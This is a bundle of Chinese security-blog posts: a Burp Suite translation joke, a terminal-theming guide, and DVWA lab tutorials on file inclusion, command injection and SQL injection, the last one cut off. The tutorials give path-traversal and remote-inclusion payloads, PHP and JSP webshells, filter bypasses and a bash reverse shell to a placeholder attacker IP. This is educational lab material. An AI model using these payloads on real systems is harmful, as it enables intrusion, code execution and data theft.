[{"content":"Burp Suite翻译大赏 不知道有多少人看到文章简介之后就开始蚌埠住了捏 :\u0026gt;\n神tm嗝套件\n正文开始! Burp Suite是一个网安人特别钟爱的Web安全测试工具，\n但是大家基本上提到该工具的时候，都会直接称呼它的英文原名Burp Suite\n(当然，这也是比较正常规范的叫法)\n但脑洞大开的Pgr决心找找Burp Suite应该怎么翻译才核里~~(没错，核弹的核)~~\n众所周知，让机器翻译来翻译专业术语/工具名字会有意想不到的惊吓\n所以，我们来让各种机器翻译来翻译以下Burp Suite\n为什么选择Burp Suite 因为这两个单词直译起来本身就很搞笑了\nBurp: 饱嗝\nSuite:套件\nGoogle翻译 本以为Google能给人一个满意的翻译= =\n但它翻译成 打 嗝 套 房 属实有点奇奇怪怪\n百度翻译 诶?百度貌似彳亍了诶\n不过它还是翻译出了Burp套件的意思，可以说是很腻害~(≧▽≦)/~\n有道翻译 有道选手在检测语言的时候就寄了诶，难道它认为Burp Suite是来自奇奇怪怪的语言吗 ;\u0026lt;\n在把语音指定为英语后，有道翻译成了 打 嗝 套 件\n但有道这个网络释义就\u0026hellip;多少有点大病\n搜狗翻译 噗哈哈哈，我第一次了解到打嗝还能组曲\n别急，还没完，搜狗网络释义\u0026hellip;.我真的会谢\u0026hellip;\n搜狗:我在网上找到了Burp Suite的n种释义\n1.设置模拟器 2.设置代理\n(注意上面那行是Burp Suite的一个释义)\n抓包测试 推荐工具\n(貌似没有猫病)\n直接可以运行,但需要安装ava platform se binary\nBurp Suite是一个功能强大的web运用安全工具,它能够扫描,分析和攻击web运用,通过手动和自动的技术\n(译文 迫真) )\n总之就是要让Burp Suite和浏览器是在一个端口,这样才能抓到你想要的\n360翻译 金山词霸 这个翻译，是真的无力吐槽\u0026hellip;\n逐渐离谱.jpg ↓↓↓\n腾讯翻译君 可以看出各大机翻平台倾向于认为存在会打嗝的套房= =\n彩蛋: 人 工 翻 译 \u0026ldquo;你会怎么翻译Burp Suite\u0026rdquo;\n英语老师: 打嗝套件..?\n网安人A: 我刚开始倾向于翻译成\u0026quot; 嗝 套 件\u0026quot;\n网安人B: 这个\u0026hellip;没办法翻译吧\u0026hellip;\n\u0026hellip;\n如果各位有什么有创业的翻译可以在评论区留言哦qaq\n","date":"2022-10-03T18:05:25+08:00","image":"https://blog.nanosec.site/p/burp-suite%E7%BF%BB%E8%AF%91%E5%A4%A7%E8%B5%8F/cover_hu2d6dba34ee932a3e26891d4bc0c7facb_272060_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/burp-suite%E7%BF%BB%E8%AF%91%E5%A4%A7%E8%B5%8F/","title":"Burp Suite翻译大赏"},{"content":"Oh-My-Posh终端美化 厌倦了默认的终端样式? 那我们就来搞些花里胡哨的东西\n本篇文章将介绍用开源工具Oh-My-Posh来美化终端\n效果演示 这次把效果演示放在最前面= =\n(生动形象，激发读者的阅读兴趣?)\n安装Oh-My-Posh Windows 打开你的终端/cmd/powershell,在其中输入\nwinget install JanDeDobbeleer.OhMyPosh -s winget 注意: 如果你需要美化WSL,请使用下文中的Linux安装方法= =\nLinux 打开你的终端，输入\nsudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh sudo chmod +x /usr/local/bin/oh-my-posh mkdir ~/.poshthemes wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip unzip ~/.poshthemes/themes.zip -d ~/.poshthemes chmod u+rw ~/.poshthemes/*.omp.* rm ~/.poshthemes/themes.zip 安装适配的字体 打开你的命令行工具，输入\noh-my-posh font install 注意：如果你是Windows用户需要以管理员身份运行命令\nWindows Terminal注意事项 你需要设置Windows终端使用这个字体\n按下快捷键CTRL + SHIFT + ,\n这个是默认快捷键，如果你修改过按你自己修改的快捷键 :\u0026gt;\n编辑settings.json修改以下内容\n{ \u0026#34;profiles\u0026#34;: { \u0026#34;defaults\u0026#34;: { \u0026#34;font\u0026#34;: { \u0026#34;face\u0026#34;: \u0026#34;字体名\u0026#34; } } } } 切换主题 Oh-My-Posh安装完成之后会有一个默认的主题\n如果不够喜欢的话可以切换其他的主题\n获取主题列表 第一个方法是在终端输入\nGet-PoshThemes 第二个方法就是去官网文档找\n换一个主题吧 Windows 打开终端，输入以下命令尝试主题\noh-my-posh init pwsh --config 主题路径/主题名.omp.json | Invoke-Expression P.S. 如果出现报错找不到命令，请将C:\\Users\\用户名\\AppData\\Local\\Programs\\oh-my-posh\\bin添加进环境变量\n一旦确定主题就去修改$PROFILE的值\nnotepad $PROFILE 写入尝试主题的那个语句\n一般来说，主题路径会是C:\\Users\\用户名\\AppData\\Local\\Programs\\oh-my-posh\\themes\n重载$Profile后生效\n. $PROFILE Linux 这个时候可以说Linux yyds了\nLinux修改主题起来特别容易，输入以下命令就能试用一个主题，也不会有讨厌的报错\n#如果你用的bash把zsh替换成bash eval \u0026#34;$(oh-my-posh init zsh --config 主题路径/主题名.omp.json)\u0026#34; 确定主题就去改~/.bashrc或者~/.zshrc\nvi ~/.bashrc vi ~/.zshrc 写入尝试主题的那个语句\n依旧是重载后生效\nexec zsh exec bash 结语 到这里为止我们的美化就完成啦QwQ\n如果大家想要更多花里胡哨的东西可以在评论区留言哦0.0\n诶?之前文章评论呢?\n\u0026ndash;因为更新主题的缘故，就寄了呜呜呜\n之后准备做一期云吸猫的文章，大家觉得怎样喵~~\nRef Ref是不能少哒- -\nhttps://ohmyposh.dev/docs/\nhttps://img-blog.csdnimg.cn/img_convert/92fc35be4ee25257ace598cf95a6064b.png#pic_center\n","date":"2022-09-25T10:51:58+08:00","image":"https://blog.nanosec.site/p/linux/windows%E7%BB%88%E7%AB%AF%E7%BE%8E%E5%8C%96/cover_hu99afe94c4a345b020505285bddeebbdd_2544478_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/linux/windows%E7%BB%88%E7%AB%AF%E7%BE%8E%E5%8C%96/","title":"Linux/Windows终端美化"},{"content":"Web安全:文件包含漏洞 漏洞原理 开发者在代码中调用了外部文件，且调用的文件名受用户输入的影响，\n在权限控制不严谨的情况下会产生文件包含漏洞(File Inclusion)\n分类 文件包含漏洞分为本地文件包含漏洞和远程文件包含漏洞\n远程文件包含（RFI，Remote File Inclusion） 在文件包含漏洞的利用过程中，Web 应用程序下载并调用了远程文件，称作远程文件包含\n这些远程文件通常以 HTTP 或 FTP URI 的形式获取\ntarget.xxx?file=http://hacker_server/evil.php 额外要求 要产生远程文件包含漏洞，在使用了特定函数和权限控制不严谨外，include,require等包含函数还必须可以加载远程文件\nPHP的配置文件allow_url_fopen和allow_url_include设置为ON\nallow_url_fopen = On //（是否允许打开远程文件） allow_url_include = On //（是否允许include/require远程文件） 本地文件包含（LFI，Local File Inclusion） 在文件包含漏洞的利用过程中，Web应用程序调用了本地(服务器上)的文件，称作本地文件包含\ntarget.xxx?file=/etc/hosts 危害 Web服务器的文件被外界浏览而导致信息泄漏\n作为进一步攻击的垫脚石 (和其他漏洞同时使用造成严重危害)\n小概率会导致命令执行\nDVWA靶场实战 打开DVWA文件包含页面(File Inclusion)\n我们发现，当我们点击file1.php时，对应的URL的page的值变为file1.php，同时Web应用执行file1.php文件的源代码；\nhttp://dvwa_ip/vulnerabilities/fi/?page=file1.php 当我们点击file2.php时，对应的URL的page的值变为file2.php，同时Web应用执行file2.php文件的源代码；\nhttp://dvwa_ip/vulnerabilities/fi/?page=file2.php 当我们点击file3.php时，对应的URL的page的值变为file3.php，同时Web应用执行file3.php文件的源代码。\nhttp://dvwa_ip/vulnerabilities/fi/?page=file3.php 由此可知，当我们在目标URL的page值后添加某个存在的文件名时，Web应用程序会相应的包含此文件。并且会将该文件(无论后缀名)作为PHP代码执行.\nlow 看一下源码\n\u0026lt;?php // The page we wish to display $file = $_GET[ \u0026#39;page\u0026#39; ]; // 通过get请求把page参数的值传入file变量 ?\u0026gt; Web应用程序定义了一个变量page，将用户输入的值作为page变量的值，同时将其赋值给file变量。最后，Web应用程序通过对file变量的引用来实现文件的包含功能。\nDVWA的low级别一般是不带有任何防护的, 没有对输入的page变量的值执行任何过滤措施，如果我们输入那些系统不希望用户看见任何信息的文件的文件名，并赋值给page变量。那么Web应用程序就会产生文件包含漏洞，系统的敏感信息就会被泄露。\npayload1:本地\u0026ndash;利用相对路径(许多个../就一定会来到根目录) ../../../../../../../../../../../../../../../../etc/passwd payload2:本地\u0026ndash;利用绝对路径 /etc/passwd payload3:远程包含 由于DWVA的环境，Web应用可以包含远程文件\nhttp://server/file medium 直接上源码\n\u0026lt;?php // The page we wish to display $file = $_GET[ \u0026#39;page\u0026#39; ]; // 依旧是通过get请求把page参数的值传入file变量 // Input validation $file = str_replace( array( \u0026#34;http://\u0026#34;, \u0026#34;https://\u0026#34; ), \u0026#34;\u0026#34;, $file ); //将file变量中的http://和https://替换为空 $file = str_replace( array( \u0026#34;../\u0026#34;, \u0026#34;..\\\\\u0026#34; ), \u0026#34;\u0026#34;, $file ); //同理，将file变量中的../和..\\\\替换为空 //但是捏，它只替换了一次且只替换全小写的内容，也就意味着可以通过双写或大小写绕过 ?\u0026gt; payload1:本地\u0026ndash;绝对路径 如果我们不使用../与..\\这两个关键词，而是直接访问根目录下的用户信息文件/etc/passwd 。\n由于Web应用程序的过滤很不严谨，并没有对根目录/执行过滤，所以系统不能过滤我们输入的payload，那么Web应用程序将成功包含文件/etc/passwd，并直接暴露其源代码。 即我们构造的payload成功的绕过了Web应用程序的防御机制。\n/etc/passwd payload2:远程\u0026ndash;双写绕过 hthttp://tp://server/file payload3:远程\u0026ndash;大小写绕过 hTtp://server/file payload4:远程本地皆可\u0026ndash;使用http/https外的协议 file:///etc/passwd high 看源码= =\n\u0026lt;?php // The page we wish to display // 日常通过get请求把page参数的值传入file变量 $file = $_GET[ \u0026#39;page\u0026#39; ]; // Input validation //如果file变量的开头不是file且file的值不为include.php //就提示找不到文件并退出程序 if( !fnmatch( \u0026#34;file*\u0026#34;, $file ) \u0026amp;\u0026amp; $file != \u0026#34;include.php\u0026#34; ) { // This isn\u0026#39;t the page we want! echo \u0026#34;ERROR: File not found!\u0026#34;; exit; } ?\u0026gt; 补充一个知识点:\nfnmatch() 函数的作用是根据指定的模式来匹配文件名或字符串。 语法为：fnmatch(pattern,string,flags) 各个参数解释如下：\npattern 必需。规定要检索的模式。\nstring 必需。规定要检查的字符串或文件。\nflags 可选. 它是可选的参数表，用于指定标志或标志的组合.\n这些标志可以是以下标志的组合：\nFNM_PATHNAME：用于指定字符串中的斜线仅匹配给定模式中的斜线。\nFNM_NOESCAPE：用于禁用反斜杠转义。\nFNM_CASEFOLD：用于无 shell 匹配。\nFNM_PERIOD：用于指定字符串中的前导期间必须与给定模式中的期间完全匹配。\nhigh模式中进行了更为安全的白名单过滤,因此现在包含的东西必须要以file开头了\npayload1:file协议正合我意 file:///etc/passwd 补充: PHP中文件包含函数 PHP中文件包含函数有以下四种\nrequire() require_once() include() include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。\n而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，从而确保它只被包括一次以避免函数重定义，变量重新赋值等问题。\n测试代码\n\u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; //可以将include换成其他函数测试 include($filename); ?\u0026gt; payload2:利用PHP可以包含多个文件的feature 由上文可推断出，如果程序员在包含的时候用的include，前面那个file开头的文件存不存在都无所谓\nfile[任何内容]../../../../../../../../../../../../../../../../etc/passwd 如果程序员在包含的时候用的require话，前面那个file开头的文件就必须存在!\nfile[补全一个存在的文件名]../../../../../../../../../../../../../../../../etc/passwd 修复 修复建议\n严格检查变量是否已经初始化。\n对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。\n严格检查文件包含函数中的参数是否外界可控。\nGetshell:session与文件包含漏洞的结合 条件 session的存储位置可以获取(phpinfo页面一般可以获取)\nsession中的内容可以被控制，传入恶意代码\n分析 \u0026lt;?php session_start(); $ctfs=$_GET[\u0026#39;ctfs\u0026#39;]; $_SESSION[\u0026#34;username\u0026#34;]=$ctfs; ?\u0026gt; 我们发现此php会将获取到的GET型ctfs变量的值存入到session中，也就是可以控制session中的内容\n我们通过phpinfo页面发现了session的存储路径/var/lib/php/session\n当访问http://ip/path/ctfs.php?ctfs=test 后，会在/var/lib/php/session目录下存储session的值。\nsession的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。\n所以session的文件名为sess_p44b454elq0mfe2vopqvfm7m37\n去服务器上查看，果然有该文件, 而且我们刚刚的test也被写入了\n利用 通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell.\nhttp://ip/path/ctfs.php?ctfs=%3C?php%20@eval($_POST[\u0026#39;shell\u0026#39;])?%3E 当访问以上链接的时候，Web应用会在/var/lib/php/session目录下存储session的值\n(同时我们的webshell也被存进去了)\n通过前端推测session储存的文件名sess_p44b454elq0mfe2vopqvfm7m37\n通过文件包含的漏洞解析恶意代码\nhttp://ip/path/include.php?filename=/var/lib/php/session/sess_p44b454elq0mfe2vopqvfm7m37 通过webshell工具连接(方便使用你的shell)\n我本地使用的是AntSword\n思考 实际上你只需把shell写到一个Web应用能访问的位置并利用文件包含漏洞进行解析就可以\n这个写入的文件可以不考虑后缀，反正最后会被解析成PHP\nBypass:远程文件包含绕过特定后缀限制 测试代码\n\u0026lt;?php include($_GET[\u0026#39;filename\u0026#39;] . \u0026#34;.html\u0026#34;); ?\u0026gt; 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀\n由于URL的特性，我们在远程文件包含的时候可以做一些事情\n?绕过 在url中，?后面的表示参数，所以说在文件后面加上?会让后面的.html变成一个参数，从而绕过特定后缀限制\n日志\n192.168.109.139 - - [11/Sep/2022 11:52:00] \u0026#34;GET /1.html?.html HTTP/1.0\u0026#34; 200 - #绕过 URL中，#号是客户端参数,用于网页位置定位,对于Bypass来讲，重要的是#号之后的参数不会传入到服务端\n日志\n192.168.109.139 - - [11/Sep/2022 12:16:08] \u0026#34;GET /1.html HTTP/1.0\u0026#34; 200 - 技巧:PHP伪协议 php:// 输入输出流 PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。\nphp://filter\n元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。\n用法 php://filter/read=convert.base64-encode/resource=你要读取的东西 过程 http://ip/path/include.php?filename=php://filter/read=convert.base64-encode/resource=你要读取的东西 如果在某些场合发现明明存在文件包含漏洞但是某些东西无法读取的话，\n可以base64编码解决\n条件 只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；\nphar://伪协议 这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。\n用法 ?file=phar://压缩包/内部文件 注意： PHP \u0026gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。\n过程 写一个php文件，然后用zip压缩为zip文件，然后将后缀改为png等其他格式,然后传入服务器。\n然后再通过文件上传漏洞和phar://伪协议解析\n同理，也可以通过这种思路进行getshell,\n将php文件中的phpinfo的代码改为一句话木马即可\n\u0026lt;?php @eval($_POST[\u0026#39;shell\u0026#39;])?\u0026gt; zip伪协议 zip伪协议和phar协议类似，但是用法不一样。\n用法 file=zip://[压缩文件]#[压缩文件内的子文件名] 条件 PHP \u0026gt; =5.3.0\n注意在windows下测试要PHP=5.3.0\n#在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。\n过程 依旧是先上传，再利用文件包含漏洞进行解析\nhttp://ip/path/include.php?filename=zip://info.jpg%23info.php 和phar一样，可shell\nphp://input 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。\n用法 ?file=php://input 数据利用POST传过去。\n条件 php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP \u0026lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。\n过程 如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马\n\u0026lt;?PHP fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[cmd])?\u0026gt;\u0026#39;);?\u0026gt; 注意:当前目录Web应用工作的用户必须要有写权限,否则写不了\n发送POST包\nPOST /test/include.php?filename=php://input HTTP/1.1 ... ... \u0026lt;?PHP fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[cmd])?\u0026gt;\u0026#39;);?\u0026gt; 然后用你的Webshell工具连接即可\n补充:系统中的敏感路径 常见的敏感路径：\nWindows\nC:\\boot.ini //查看系统版本\nC:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS 配置文件\nC:\\windows\\repair\\sam //存储 windows 系统初次安装的密码\nC:\\Program Files\\mysql\\my.ini //mysql 配置\nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root\nC:\\windows\\php.ini //php 配置信息\nC:\\windows\\my.ini //mysql 配置文件\nUNIX/Linux\n/etc/passwd\n/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件\n/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置\n/usr/local/app/php5/lib/php.ini //PHP 相关配置\n/etc/httpd/conf/httpd.conf //apache\n/etc/php5/apache2/php.ini //ubuntu 系统的默认路径\n日志默认路径\napache+Linux 日志默认路径 /etc/httpd/logs/access_log或者/var/log/httpd/access_log\napache+win2003 日志默认路径 D:\\xampp\\apache\\logs\\access.log, D:\\xampp\\apache\\logs\\error.log\nIIS6.0+win2003 默认日志文件 C:\\WINDOWS\\system32\\Logfiles\nIIS7.0+win2003 默认日志文件 %SystemDrive%\\inetpub\\logs\\LogFiles\nnginx 日志文件 日志文件在用户安装目录 logs 目录下,以我的安装路径为例/usr/local/nginx, 那我的日志目录就是在/usr/local/nginx/logs里\nweb 中间件默认配置\napache+linux 默认配置文件 /etc/httpd/conf/httpd.conf或者index.php?page=/etc/init.d/httpd\nIIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml\nIIS7.0+WIN 配置文件 C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\nP.S. burp的intruder里面自带一些路径\nJavaweb:文件包含? 以为只有PHP中存在文件包含漏洞?\n不不不~~ :)\n实际上只要存在文件包含的功能，无论语言都有可能存在这样的问题，\n而且利用的逻辑基本上是相同的\n小逝验 在目标机器上起一个Tomcat环境\n新建一个test.jsp,\n输入以下代码搭建一个简单的javaweb文件包含漏洞环境\n\u0026lt;!--输出提示--\u0026gt; \u0026lt;%out.println(\u0026#34;Input your payload as GET parameter \u0026#39;payload\u0026#39;\u0026#34;);%\u0026gt; \u0026lt;br\u0026gt; \u0026lt;%out.println(\u0026#34;Output: \u0026#34;);%\u0026gt; \u0026lt;br\u0026gt; \u0026lt;!--获取payload参数内容传入变量payload--\u0026gt; \u0026lt;%String payload = request.getParameter(\u0026#34;payload\u0026#34;);%\u0026gt; \u0026lt;!--包含变量payload内的内容--\u0026gt; \u0026lt;jsp:include page=\u0026#34;${param.payload}\u0026#34; /\u0026gt; 玩法 给payload参数传你想要包含的路径\nhttp://ip:8080/path/test.jsp?payload=文件名 测试 在test.jsp的相同目录新建一个1.jsp\n\u0026lt;%@ page import=\u0026#34;java.util.*,java.io.*\u0026#34;%\u0026gt; \u0026lt;% Process p; p = Runtime.getRuntime().exec(\u0026#34;操作系统命令\u0026#34;); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } %\u0026gt; 然后访问\nhttp://ip:8080/path/test.jsp?payload=1.jsp 让1.jsp被包含\n注意事项 在本实验中被包含文件后缀会被识别，不会强制当成jsp代码执行，另外一种包含的方式\u0026lt;%@include file='文件'%\u0026gt;可以\u0026hellip;但是file后面的东西必须是字符串，不能是变量，因此无法造成文件包含漏洞\u0026hellip;\n由此可见，Javaweb在这方面的安全性比PHP会高一些\n","date":"2022-09-13T20:07:24+08:00","image":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover_hub6d28757c33c1ef5c0f635b7b627146b_864309_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","title":"Web安全:文件包含漏洞"},{"content":"Web安全:命令执行/注入(RCE) 与其说是死亡之ping\u0026hellip;\n还不如直接说:RCE之PING\nPing怎么了? 其实ping本身没有什么问题\u0026hellip;\n但由于某些网站提供了在线ping的功能，这个功能中调用了系统命令且把用户输入代入命令中，但由于开发者的考虑不周，导致网站没有对用户的输入进行过滤(喂啥网站就吃啥)或者过滤机制不严谨(网站吃了一些喂给它诱人但不该吃的东西)\n然后捏,,,,攻击者就可以通过传入一些精心构造的攻击语句使原命令发生了歧义，从而执行了系统命令\nRCE漏洞 上面的Ping功能的例子就是一个简单的RCE漏洞\n成因\u0026amp;\u0026amp;利用条件 应用调用执行系统命令的函数\n将用户输入作为系统命令的参数拼接到了命令行中\n没有对用户输入进行过滤或过滤不严\n虽说上面只有三点条件，但实际上这种漏洞还是在一般的Web渗透测试中很少见\u0026hellip;\n为什么捏?\n\u0026ndash;因为大部分Web应用很少有用到调用系统命令的需求\u0026hellip;嘛= =，既然用的少，出现问题的可能性就小0w0\n(毕竟一个人食物中毒的可能性比他在某天刚好被陨石砸中的可能性大嘛= =)\n分类 代码层过滤不严\u0026ndash;Ping的案例\n系统的漏洞造成命令注入\u0026ndash;bash破壳漏洞(CVE-2014-6271)\n调用的第三方组件存在代码执行漏洞\u0026ndash;著名的Log4Shell\n危害 RCE\u0026hellip;可以说是危害巨大\u0026hellip;\n要是不明白等到鼠标自己动起来应该就明白了\n咳咳，正经说一下\n以Web服务的权限执行系统命令/读写文件\n控制整个网站甚至控制服务器\n进一步内网渗透\n靶场实战 打开DVWA到Vulnerability: Command Injection\n看到这是一个Ping的界面\n简单想一下，我们应该如何让这个命令语句歧义从而达到死亡之Ping的效果捏\n最好的方法是让系统在ping完成之后再执行另一个命令\n刚好操作系统有特定的字符可以拼接两个命令\nLinux\n\u0026amp;\u0026amp; 表示上一条命令执行成功时，才执行下一条命令\n| 表示管道，上一条命令的输出，作为下一条命令参数\n|| 表示上一条命令执行失败后，才执行下一条命令\n; 表示先执行上一条命令，再执行下一条命令(无论上一条命令是否执行成功)\nP.S. 在Linux中\u0026amp; 表示任务在后台执行哦qwq\nWindows\n\u0026amp;\u0026amp; 表示上一条命令执行成功时，才执行下一条命令\n|| 表示上一条命令执行失败后，才执行下一条命令\n\u0026amp; 表示先执行上一条命令，再执行下一条命令(无论上一条命令是否执行成功)\nLow 这个版本就是属于喂啥吃啥的类型\n简单写一个payload\n127.0.0.1;whoami Medium 看一眼源码\n// Set blacklist $substitutions = array( \u0026#39;\u0026amp;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 发现它过滤了黑名单中的\u0026amp;\u0026amp;和;字符\n换成黑名单中没有否字符即可\n||whoami P.S. 因为没有ip,所以Ping执行失败了，所以执行后面的whoami命令\nHigh 这次的黑名单已经很全了\n// Set blacklist $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;| \u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the characters in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 不过捏，细心的朋友应该发现了，这个容易手滑的开发者做了一个有大病的事情\n程序过滤了| (有空格)，而不是|\u0026hellip;\n所以我们完全可以用|绕过去\n127.0.0.1|whoami 反弹Shell 为了能更优雅，舒适地控制目标机器\n我们可以弹个shell\n先在攻击的机器上用nc监听一个端口(端口任意，只要不被其他东西占用)\nnc -lvnp 端口号 在靶机输入payload\n127.0.0.1|bash -i \u0026gt;\u0026amp; /dev/tcp/攻击机器ip/端口号 0\u0026gt;\u0026amp;1 关于防御的思考 其实嘛，基于白名单更安全的原则，把输入限制成四段以点分隔开的数字就能很好的防御住这种攻击\n但是捏,,,\n如果对方的业务需要支持ping域名的话\u0026hellip;\n这种防御就影响正常业务了\n因而安全防御必须得适合当前的业务，否则就有点因噎废食的感觉了= =\nRef https://blog.csdn.net/zhangyu4863/article/details/83958641\nhttps://blog.csdn.net/yrk0556/article/details/104308866\nhttp://book.fsec.io/201-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B7%A5%E5%85%B7/201-A-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/201-A9-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5.html\n","date":"2022-09-02T21:29:09+08:00","image":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover_hu7c854b3953090c9fdfa2da02ac591aa6_4062930_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/","title":"Web安全:命令执行/注入(RCE)"},{"content":"Web安全:SQL注入基础知识和简单绕过 这是一只Hacker猫在学习SQL注入的时候留下的笔记\n概念 网上嘛\u0026hellip;都是那么一大长串的概念\u0026hellip;特别难记\n简单理解概括一下本质，其实就可以缩减成一句话\n攻击者插入恶意的SQL语句，使得原本的语句产生歧义，从而达到攻击者的目的\n所以说，SQL注入攻击要成功的话得满足以下条件\n恶意SQL语句要被带入数据库执行\n也就意味着:\n网站要有数据库\n该处与数据库有交互\n用户输入的数据会被代入SQL语句\n代码不再按照原本的逻辑，而是以攻击者的逻辑运行\n分类 一句话说就是:分为显著和盲注;)\n显注 这个没什么好说的，就是当攻击者拼接SQL语句注入时，网站会把SQL语句的执行结果显示在网页上.\n很明显对吧= =\nTip: 一般显注很多时候都要用到UNION,如果关键词检测就怼UNION和SECLET的话可以用盲注的payload,毕竟盲注的payload显注也能梭哈，就是烦了点(\n盲注 盲注与显著相反，网站不会把SQL语句的执行结果显示出来。\n当然，盲注还分为两个小类，分别是\n布尔型\n这个一般在网站只提示你是或者否的时候\n时间型\n最适合梭哈的类型，要是显著和布尔型盲注无从下手就可以用时间型\n而且，时间型注入的payload是所有类型SQL注入通用的\n靶场实战 显注 将DVWA安全级别调为low,并来到SQL Injection界面\n我们看到一个输入框\n检测注入点 输入1'疯狂试探\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near \u0026#39;\u0026#39;1\u0026#39;\u0026#39;\u0026#39; at line 1 看到报错，说明这里肯定有注入点\n(我们的输入被带入数据库中执行并引发了歧义)\n查询数据库中信息 我们先逝世试试看该如何闭合原SQL语句\n闭合篇 第一次尝试双引号闭合\n发现1\u0026quot; and 1=2#返回结果\n看起来双引号并不能起到闭合的作用\n再看看单引号\n输入1' and 1=2#发现查询不到结果，\n输入1' and 1=1#有结果且和输入1的结果相同\n所以:↓↓↓\nTaDa! 单引号闭合成功\nUNION篇 现在，该利用联合查询，查看一下字段数量和查询的数据回显的位置。\n发现在输入1' and 1=2 union select 1,2 #的时候刚好不报错\n一个小Tip:为了不使UNION前面的语句查询到的结果干扰测试，\n这里用and 1=2 把前面的结果干掉了喵~~\n当然把1改成-1也可以 (其实本质就是让UNION前面的语句查到结果)\n所以，我们可以发现First name处显示结果为第一个查询结果的值，surname处显示结果为第二个查询结果的值\n接下来,利用各种内置函数注入得出连接数据库用户以及数据库名称和版本，操作系统类型:\n1\u0026#39; and 1=2 union select user(),database()# 1\u0026#39; and 1=2 union select @@global.version_compile_os,version() from mysql.user# 结果:\nID: 1\u0026#39; and 1=2 union select user(),database()# First name: root@localhost Surname: dvwa ID: 1\u0026#39; and 1=2 union select @@global.version_compile_os,version() from mysql.user# First name: Linux Surname: 5.5.68-MariaDB 你好，数据篇 接下来就是要到了逐步获取库名，表名，列名，数据的环节了\n高版本的mysql和MariaDB数据库有一个特征，即information_schema库.\ninformation_schema 库用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。\ninformation_schema 